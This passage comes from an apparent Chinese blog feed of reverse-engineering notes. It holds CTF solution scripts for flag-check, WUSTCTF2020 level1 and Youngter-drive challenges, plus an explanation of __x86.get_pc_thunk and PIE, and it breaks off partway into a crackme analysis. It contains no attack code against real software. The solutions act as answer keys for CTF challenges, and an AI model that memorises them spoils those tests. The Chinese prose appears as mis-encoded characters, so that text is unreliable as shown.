class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ¹é…è‡³å°‘ä¸‰æ¬¡æ•°å­—æ‰æœ‰æ•ˆ</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>åæ¥ç”±äºè¿™ä¿©å‘ç‚¹å°±æ€ä¹ˆäº¤ä¹Ÿä¸å¯¹ï¼Œæœäº†å¸ˆå‚…ä»¬çš„wpæ‰å‘ç°â€¦<br>è¿˜æœ‰ä¸€ç§è§£æ³•å°±æ˜¯ç”¨z3çº¦æŸå™¨æ¥è§£ï¼ˆå­¦åˆ°äº†å­¦åˆ°äº†</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>ç”¨è¿™ç§æ–¹æ³•æ¥è§£ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œå…ˆè§£å‡ºæ¥ç„¶åå†è½¬asciiç <br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>æºç å’Œé€»è¾‘éƒ½å¾ˆç®€å•ï¼Œå¯¹flagè¿›è¡ŒåŠ å¯†ï¼Œç„¶åè¿˜ç»™äº†outputæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯flagåŠ å¯†åçš„è¾“å‡ºç»“æœ<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>å†™ä¸ªè§£å¯†è„šæœ¬å°±è¡Œäº†ï¼ˆ1ï¼Œ3ï¼Œ5ï¼Œ7â€¦ä¸1ç›¸ä¸ä¸º1ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPXè„±å£³:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>å…ˆå»ä¸ªå£³<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>mainå‡½æ•°ä¸­å¯åŠ¨äº†ä¸¤ä¸ªå­çº¿ç¨‹<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>ç¬¬ä¸€ä¸ªçº¿ç¨‹å¯¹äºæˆ‘ä»¬è¾“å…¥çš„flagè¿›è¡Œæ›¿æ¢<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// å¤§å†™å­—æ¯ - 38ï¼Œå³27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// å°†ç´¢å¼•æ˜ å°„åˆ°å¦å¤–ä¸€å¼ è¡¨è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// å°å†™å­—æ¯ - 96ï¼Œå³1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªçº¿ç¨‹åªæ˜¯å‡å»dataæ®µçš„ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥å‘ç‚¹1å°±æ˜¯åœ¨æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­ï¼Œåªæœ‰å¶æ•°ä½ï¼ˆ0ï¼Œ1ï¼Œ3,â€¦29ï¼‰è¢«è¿›è¡Œæ›¿æ¢äº†<br>æ›¿æ¢é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œè§ä¸Šé¢è´´çš„æ³¨é‡Š</p><p>å‘ç‚¹2å°±æ˜¯æœ€åcheckçš„æ—¶å€™åªæ£€æŸ¥äº†29ä½ï¼Œæœ€åä¸€ä½æœçš„wpæ˜¯å¡«Eï¼ˆå¥½åƒåœ¨å®‰æ’èµ›çš„æ—¶å€™å¡«å•¥éƒ½å¯¹ï¼Œç„¶åçœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„wpè§‰å¾—åº”è¯¥å¡«Zï¼Œå› ä¸ºæ˜ å°„å›æ¥æ­£å¥½æ˜¯NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>è„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; &#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>å¤§å¸ˆå‚…çš„wpï¼Œè¯¦ç»†è§£é‡Šäº†è¿™ä¸ªç¨‹åºä¸­åè°ƒè¯•çš„éƒ¨åˆ†ï¼Œå€¼å¾—é˜…è¯»:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.axå‡½æ•°</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>cè¯­è¨€åˆ°æ±‡ç¼–æŒ‡ä»¤è¿™ç¯‡åšæ–‡ä¸­ï¼Œæˆ‘ä¸€å¼€å§‹é€šè¿‡gccç¼–è¯‘æºæ–‡ä»¶ï¼Œæ²¡æœ‰å…³é—­åœ°å€éšæœºåŒ–è¿™ä¸ªé€‰é¡¹ï¼Œåœ¨ç¼–è¯‘å‡ºçš„ç¨‹åºçš„åæ±‡ç¼–ä¸­ï¼Œå‘ç°äº†å¾ˆå¥‡æ€ªçš„callæŒ‡ä»¤<br>æºç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åæ±‡ç¼–</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">â”‚   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">â”‚   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">â”‚   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">â”‚   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">â”‚   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">â”‚   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">â”‚   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">â”‚   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">â”‚   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">â”‚   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">â”‚   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>åœ¨main+10çš„ä½ç½®å¤„è°ƒç”¨äº†ä¸€ä¸ª__x86.get_pc_thunk.axï¼Œå¾ˆå¥½å¥‡è¿™ä¸ªæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼ŒgdbåŠ¨æ€è°ƒè¯•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>å‘ç°äº†åªæœ‰ä¸¤æ¡æ±‡ç¼–æŒ‡ä»¤</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>espå­˜çš„å°±æ˜¯mainå‡½æ•°çš„åœ°å€ï¼ˆå› ä¸ºåœ¨mainå‡½æ•°ä¸­calläº†å½“å‰è¿™ä¸ªå‡½æ•°ï¼‰</p><p>ç®€å•è¯´è¿™ä¸ªæŒ‡ä»¤å°±ç›¸å½“äº<code>mov eax,eip</code></p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯getåˆ°mainå‡½æ•°çš„åœ°å€</p><p>å¾ˆå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆè¦è·å¾—mainå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>å‘ç°eaxè¿™é‡Œé€šè¿‡addä¸€ä¸ªæ•°å­—åå˜æˆäº†GOTè¡¨çš„åœ°å€ï¼Œè¿™æ ·å°±ä¸éš¾ç†è§£äº†ï¼ˆå…³äºä»€ä¹ˆæ˜¯GOTè¡¨å’ŒPLTè¡¨ï¼Œæˆ‘ä¼šåé¢å†å±•å¼€æ–‡ç« è¿›è¡Œå­¦ä¹ è®°å½•ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°åœ¨x86ä¸Šçš„PICï¼ˆposition independent codeï¼‰ä¸­ä½¿ç”¨ï¼Œç”¨æ¥å®ç°å¯¹æ¨¡å—çš„å†…éƒ¨æ•°æ®è¿›è¡Œè®¿é—®ï¼Œæ¯”å¦‚å…¨å±€å˜é‡ã€‚æˆ‘ä»¬åœ¨mainå‡½æ•°ä¸­è®¿é—®ä¸€ä¸‹å…¨å±€å˜é‡xï¼Œç”¨gdbæŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œæœç„¶å¯ä»¥çœ‹åˆ°ç¨‹åºè®¿é—®xæ˜¯é€šè¿‡GOTè¿›è¡Œçš„ã€‚</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>äº‹å®ä¸Šç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰ï¼š<code>__x86.get_pc_thunk.bx</code>ï¼Œ<code>__x86.get_pc_thunk.cx</code>ï¼Œ <code>__x86.get_pc_thunk.dx</code>ã€‚åŠŸèƒ½æ˜¯ç±»ä¼¼çš„ï¼Œåªä¸è¿‡ä¼ å…¥çš„å¯„å­˜å™¨åˆ†åˆ«ä¸º<code>%ebx</code>ï¼Œ <code>%ecx</code>ï¼Œ <code>%edx</code>ã€‚æ—©æœŸç‰ˆæœ¬çš„ç¼–è¯‘å™¨ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å«<code>__i686.get_pc_thunk.ax</code>ã€‚</p></blockquote><h2 id="å…³é—­pie"><a href="#å…³é—­pie" class="headerlink" title="å…³é—­pie"></a>å…³é—­pie</h2><p>ä½¿ç”¨gccç¼–è¯‘å‘½ä»¤</p><p><code>gcc -fno-pie</code></p><p>å…³é—­pieï¼Œè°ƒè¯•ç¨‹åºå‘ç°å·²ç»ä¸éœ€è¦å†é€šè¿‡è¯¥å‡½æ•°è¿›è¡Œå¯»å€äº†</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.axå‡½æ•°</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peachâ€™s-Crackme"><a href="#Peachâ€™s-Crackme" class="headerlink" title="Peachâ€™s Crackme"></a>Peachâ€™s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>ç¨‹åºç®€ä»‹ï¼Œä¸€ä¸ªç®€å•çš„æ³¨å†ŒåŠŸèƒ½<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>é¦–å…ˆx64dbgåˆ†æä¸€ä¸‹ï¼Œæ ¹æ®ç¨‹åºåŠŸèƒ½æ‰¾æ‰¾å­—ç¬¦ä¸²å•¥çš„<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDAé™æ€åˆ†æï¼Œæ¥å®šä½ä¸€ä¸‹åœ°å€å•¥çš„ï¼Œç„¶åf5å¤§æ³•ç›´æ¥è¯»ä¼ªä»£ç <br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span 